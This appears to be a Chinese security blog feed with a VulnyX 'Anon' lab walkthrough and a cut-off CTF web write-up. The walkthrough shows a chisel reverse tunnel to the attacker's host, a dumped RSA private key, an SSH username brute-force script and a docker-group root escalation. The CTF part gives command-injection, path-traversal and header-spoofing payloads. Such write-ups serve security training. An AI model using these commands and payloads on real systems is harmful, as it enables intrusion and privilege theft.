10.10.10.10/24<br>10.10/24 -n -p- 10.10.1<br>Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-24 06:55 UTC<br>sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.10.20, 16) =&gt; Operation not permitted<br>Offending packet: TCP 10.10.10.10:50197 &gt; 10.10.10.20:7523 S ttl=51 id=3850 iplen=44  seq=3559377068 win=1024 &lt;mss 1460&gt;<br>sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.10.1, 16) =&gt; Operation not permitted<br>Offending packet: TCP 10.10.10.10:50197 &gt; 10.10.10.1:2952 S ttl=46 id=18601 iplen=44  seq=3559377068 win=1024 &lt;mss 1460&gt;<br>Nmap scan report for 10.10.10.1<br>Host is up (0.000011s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 02:42:D4:5D:80:BF (Unknown)<br><br>Nmap scan report for 10.10.10.20<br>Host is up (0.000017s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>2222/tcp open  EtherNetIP-1<br>MAC Address: 02:42:0A:0A:0A:14 (Unknown)<br><br>Nmap scan report for 10.10.10.10<br>Host is up (0.0000080s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br><br>Nmap done: 256 IP addresses (3 hosts up) scanned in 7.98 seconds<br></code></pre></td></tr></table></figure><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>在<code>10.10.10.20</code>中存在<code>2222</code>端口开放，我们需要端口转发。</p><p>上传<code>chisel</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kali : chisel server -p 12345 --reverse<br>baji : chisel client kali-ip kali-port R:port:127.0.0.1:port<br></code></pre></td></tr></table></figure><p><img src="/img/vulnyx-Anon/image-20250424151221435.png"></p><p><img src="/img/vulnyx-Anon/image-20250424151214297.png"></p><p>成功转发端口 </p><p>尝试ssh登录 （上面获得到一个root密码）</p><p><img src="/img/vulnyx-Anon/image-20250424151252058.png"></p><p>很明显我们还在docker里<img src="/img/vulnyx-Anon/image-20250424151318667.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@debian2:~# ls -al<br>total 28<br>drwx------ 4 root root 4096 Feb  4 22:01 .<br>drwxr-xr-x 1 root root 4096 Feb  4 11:17 ..<br>-rw------- 1 root root   93 Feb  4 23:12 .bash_history<br>-rw-r--r-- 1 root root  586 Feb  4 20:29 .bashrc<br>drwxr-xr-x 3 root root 4096 Feb  4 20:21 .local<br>-rw-r--r-- 1 root root  161 Jul  9  2019 .profile<br>drwx------ 2 root root 4096 Feb  4 21:38 .ssh<br>root@debian2:~# cd .ssh<br>root@debian2:~/.ssh# ls<br>authorized_keys  id_rsa<br>root@debian2:~/.ssh# cat id_rsa <br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEpQIBAAKCAQEAka2UWifZhkBCszlEWwhay91iCnRKXAlPkYRCrIYx2K8ElWv7<br>Cz6kzzLQhTdgCADpOZGJlsVnHeBUV2b5LoefoSSrcjgpM8g/55V+yUR/VOE46ZjW<br>yYwMCouvP4jmAQa40fmPCWBvKaMh0DQHBb5yrhS4rmEZdn7v6nyBaArQgCXFlYM9<br>NMirGtH6cKhKq9fgp2yEDfyvluq2DNZHcMwhPB9mFEOEjQsJ4DlRod0WeFJSVZSy<br>TCe/2sDRxYGEHsPyMJYs4ruAHInUJIYBCwsPredsEmNrxENjirpp8PjTIpC+kXBE<br>gLGIcjzunzT2M3L7HMCjGnJ4AV8nzykjkmD9jQIDAQABAoIBAHON3Zx5+ajtNjtW<br>FKuk/+iwLcGfJxDEbfI+mGijdcysX5Vq9tKfmTml1BOnriwLFPUORbZr1XS0ahJ+<br>YvAOsoevP7O1arFhiZdYVR6vj9UzZeKd0tpClZaT4KokHFX6EAa2z0gfz22Wsg6m<br>Bl//BpahZzEjYoBFBmfY5QkzctoCZQRhkTAhR520+oCFiosHGyiH6QCGYsO6WmwQ<br>7w7cm7rQ/MLNkgenRFUm0PRXrqti2K3kFUnU/Pfb9k4DoUtKSjpvA3kNbH9pIxlN<br>skbCJJfJeQpalBKwQyGqNkCzH9qMm31ZuLHsp6L73po2rWFIcoeraLhA/5No+S21<br>+v01t30CgYEA5mtTtslQmR2xhVr69z1lDdaFFaGsUWH5vlIGBvphAQsl2OwUbWk/<br>7rLy4yhddEYTfyc5xorkRsjmNjNyhMrtYks1ycvtEvCee7NuGHSO0Grzp3MKbAAY<br>t/gmGMckr9zdcsVVCIshm8PYo4feXClrHMe0MWLv97kcgGWvGLH+4UcCgYEAodnZ<br>dPL9J/O83kO5zybWlUL4RoIGLdP2axqNxoDju87qKNTKdsrKnmNV5NlQ+VH05eZ/<br>gQ5ninqFAR0hsvf4AHYmjySwY6S6mGnrXlhYkUE37crHVxdQruvtgUk4cTB0Lbk9<br>Vg0LoAnCJr96nJSWVcpER/p7/KD1LIcU/4oT9IsCgYEAlCT9NdBJWaiVsj/Ei6GV<br>j0gVWMsRl2F+yLbD2UixhZI9SzK+D3pT+IxlTVdufotvjZkStGwoSLpyCPca8fXm<br>mgPxGUVbr4m026OJbX/DMo0RCuAUG0wUmHObSuL+23MNjfUBrvSFLzjD2KBKfsbC<br>b0aWvAn4bzU89fBqm14VmZECgYEAn1T7+2J+j8cl5lUb5W9hjb1I9vhnptPk4VlZ<br>utIF30x6PkoFKt7GixhVZZ3+VgM1qOG6Ic2RZsTojMkl9K6iSaoGmaJPtzhirUqQ<br>d+dXAWAH9CNNDFKajikaPc1cMCm4JY8Xb9AV4q3YoRadWOn5+WjOwWE4j+HQms48<br>gLhonrMCgYEAthB9GOhxzeX5VEaw91tWhAdD+WNEO9TMN9fsyE9cISddgmBA5ozh<br>aTJl/gt09UodQhCNTmjYGByTkzGPH5c01HVhWfompn3GmK3jKwTbrUYh+P13Q1vn<br>A6j+O3UaX0P8w4seXeGyU2DA9iWCkwiKUUb4nj5IWt50Khmjv7BaXog=<br>-----END RSA PRIVATE KEY-----<br>root@debian2:~/.ssh# <br></code></pre></td></tr></table></figure><p>这个<code>id_rsa</code>我们不知道是哪个用户的。看起来有可能是真实机器用户的<code>id_ras</code></p><p>爆破<code>user</code></p><h4 id="brute-user"><a href="#brute-user" class="headerlink" title="brute user"></a>brute user</h4><blockquote><p>脚本，第一次写有点拉。不是完全体</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>brute_user()&#123;<br><br>    if ( $# -lt 3 );then <br>        echo -e &quot;$&#123;BLUE&#125;Usage:$&#123;NC&#125; &lt;user-dict&gt; &lt;target-ip&gt; &lt;id_rsa_path&gt;&quot;<br>        exit 1<br>    fi<br><br><br>    USERS_DICT=$1<br>    RHOST=$2<br>    ID_RSA_PATH=$3<br><br>    if [ ! -f &quot;$USERS_DICT&quot; ]; then <br>        echo -e &quot;$&#123;RED&#125; $USERS_DICT does not exist! $&#123;NC&#125;&quot;<br>        exit 1<br>    fi <br><br>    if [ ! -f &quot;$ID_RSA_PATH&quot; ]; then <br>        echo -e &quot;$&#123;RED&#125; $ID_RSA_PATH does not exist! $&#123;NC&#125;&quot;<br>        exit 1<br>    fi <br><br><br>    chmod 600 &quot;$ID_RSA_PATH&quot;<br><br>    for user in $(cat $USERS_DICT); do <br>        timeout 0.5 ssh -i &quot;$ID_RSA_PATH&quot; &quot;$user&quot;@&quot;$RHOST&quot; -x id &amp;&gt;/dev/null<br>        if [ $? -eq 0 ];then<br>            echo -e &quot;$&#123;GREEN&#125;[+] User $user is valid $&#123;NC&#125;&quot;<br>            exit<br>        else <br>            echo -e &quot;$&#123;RED&#125;[-] User $user is invalid$&#123;NC&#125;&quot;<br>        fi<br>    done <br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>原理就是通过ssh连接，如果执行id成功则代表用户名正确。</p><p><img src="/img/vulnyx-Anon/image-20250424152752336.png"></p><h4 id="ssh-登录真实机器"><a href="#ssh-登录真实机器" class="headerlink" title="ssh 登录真实机器"></a>ssh 登录真实机器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/tmp]<br>└─# ssh alfredo@192.168.56.104 -i id_rsa<br>-bash: warning: setlocale: LC_ALL: cannot change locale (zh_CN.UTF-8)<br>alfredo@anon:~$ id<br>uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo),109(docker)<br>alfredo@anon:~$ <br></code></pre></td></tr></table></figure><p>存在docker组中，直接提权。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">alfredo@anon:~$ docker run -v /:/mnt/ --rm -it debian chroot /mnt bash<br>root@4fa9df644703:/# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@4fa9df644703:/# cat /root/root.txt <br>f3a421bdd1e5119f49c3fda29838cf79<br>root@4fa9df644703:/# cat /home/alfredo/user.txt <br>af13f20ce2fb4266b4d381cf8f60f85f<br>root@4fa9df644703:/# <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>商丘师范学院第四届网络安全及信息对抗大赛（校外赛）</title>
    <link href="/2025/04/23/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/"/>
    <url>/2025/04/23/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="RceMe"><a href="#RceMe" class="headerlink" title="RceMe"></a>RceMe</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;com&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$command</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$command</span>) &lt;= <span class="hljs-number">5</span>) &#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;你小子干什么呢？&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>com</strong>传参，并且传入的参数需要 <strong>&lt;&#x3D;5</strong></p><blockquote><p>payload ：<code>http://challenge.qsnctf.com:32123/?com=nl /*</code></p></blockquote><hr><h3 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h3><p>前端小游戏<br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image.png"></p><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>找到<code>getflag()</code>函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">getFlag</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>;<br>        req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;flag.php?score=&quot;</span>+obj.<span class="hljs-property">score</span>,<span class="hljs-literal">true</span>);<br>        req.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>);<br>            &#125;<br>        req.<span class="hljs-title function_">send</span>();<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>从代码中看到通过get方法打开flag.php并进行传参将会得到flag。<br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/2.png"></p><h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>通过控制台直接对score进行赋值，然后执行<code>getFlag()</code><br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/3.png"></p><hr><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>一个ping程序，不可以执行奇奇怪怪的命令哦</p><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-string">&#x27;;&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker detected!&#x27;</span>);<br>    &#125;<br>    <br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 1 &quot;</span> . <span class="hljs-variable">$ip</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传ip，但是不能有<code>;</code>。我们还可以使用<code>&amp;(%26)、%0a、||等</code></p><blockquote><p>payload: <code>?ip=%0acat /flag </code></p></blockquote><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/4.png"></p><hr><h3 id="Are-you-from-SQNU"><a href="#Are-you-from-SQNU" class="headerlink" title="Are you from SQNU?"></a>Are you from SQNU?</h3><p>这是一道考察HTTP知识点的题目，抓一下包。<br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/5.png"><br>让我们使用<code>POST 方法</code><br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/6.png"><br>传入<code>hhh=abc</code><br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/7.png"><br>这个页面必须从<code>https://sqnu-tysec.com</code>来。设置一下referer<br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/8.png"><br>设置UA为<code>TYsecBrowser</code><br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/9.png"><br>不是本地人？设置一下XFF欸。<br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/10.png"><br>让我们设置<code>cookie: user=admin</code><br><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/11.png"><br>OK,通过层层关卡，终于拿到flag！</p><hr><h3 id="Through"><a href="#Through" class="headerlink" title="Through"></a>Through</h3><p>进入题目后，在主页面有一些描述 </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423202833862.png"></p><p>点击<code>Click to see</code> 能够得到url参数 </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423202933944.png"></p><p>看起来有可能是文件包含？</p><p>存在文件包含，经过尝试是把<code>../</code> 替换为了空。但只有一次替换，所以我们可以使用这种方式绕过：<code>..././</code> ，如此第一个<code>../</code>被替换为空后就只剩<code>.</code>拼接后面的<code>./</code>变成了需要的<code>../</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423203351049.png"></p><blockquote><p>payload: <code>index.php?file=..././..././..././..././..././..././..././..././..././..././..././..././..././..././flag</code></p></blockquote><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423203421916.png"></p><hr><h3 id="File-download"><a href="#File-download" class="headerlink" title="File_download"></a>File_download</h3><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423203539140.png"></p><p>登录框，存在一个<code>help.txt</code></p><p>点击后跳转到<code>help.jsp</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423203602542.png"></p><p>Servlet？会不会存在<code>WEB-INF</code>泄露呢？</p><p>访问<code>/DownloadServlet</code>给了提示，需要传参</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423203647306.png"></p><p>传参是<code>filename</code></p><p>通过报错获取到路径</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423204016802.png"></p><p><code>com.ctf.file.DownloadServlet</code></p><p>那么我们需要查看一下<code>WEB-INF</code>下的<code>web.xml</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423204122411.png" alt=" "></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.5&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>JavaTest2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.ctf.file.DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagManager<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.ctf.flag.FlagManager<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagManager<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/FlagManager<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span 